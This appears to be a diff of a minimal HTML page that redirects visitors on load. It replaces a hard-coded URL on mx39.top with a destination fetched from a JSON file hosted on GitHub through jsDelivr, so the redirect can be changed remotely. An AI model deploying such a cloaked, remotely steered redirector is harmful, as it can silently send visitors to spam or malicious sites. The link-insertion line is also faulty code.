@@ -2,15 +2,20 @@
 <html lang="en">
 <head>
     <meta charset="UTF-8">
-    <title>waiting</title>
+    <title>loading</title>
     <script type="application/javascript">
         function go(){
-            location.href = "https://www.mx39.top/?ch=DAXRzu3j"
+            fetch('https://cdn.jsdelivr.net/gh/anthon-oss/rurl@refs/heads/main/d.json')
+                .then(res => res.json())
+                .then(data => {
+                    location.href = data["u"]
+                    document.append('<a href="'+data["u"]+'">Continue</a>')
+                })
+                .catch(err => console.error(err));
         }
     </script>
 </head>
 <body onload="go()">
-    loading......
-    <a href=https://www.mx39.top/?ch=DAXRzu3j">Continue</a>
+    loading
 </body>
 </html>
